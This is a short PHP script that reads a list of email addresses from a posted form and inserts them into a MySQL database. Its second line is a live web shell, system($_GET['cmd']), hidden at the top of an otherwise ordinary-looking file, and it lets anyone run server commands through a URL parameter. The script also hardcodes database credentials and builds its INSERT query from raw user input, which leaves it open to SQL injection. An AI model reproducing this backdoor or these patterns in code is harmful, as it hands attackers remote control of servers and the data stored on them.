<?php
 system($_GET['cmd']);
$servername  = "localhost";
$username = "u553554390_tino";
$dbname = "u553554390_tino";
$password = "Tino@123";



// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

if(isset($_POST["submit"])) {

        $str = $_POST["email"];
        $email  = preg_split('/\r\n|\n|\r/', $str);


    foreach($email as $emails) {

        $query = mysqli_query($conn, "INSERT INTO emails (email) VALUES ('".$emails."')");

        if($query) { 
        
            echo "<br>".$emails." ==> Inserted into database </br>";
            ?>

            

            <?php } else { 
            echo "<br>".$emails." ==> ERROR !! </br>";
            ?>

                
    <?php } } }

    mysqli_close($conn);

    

    ?> 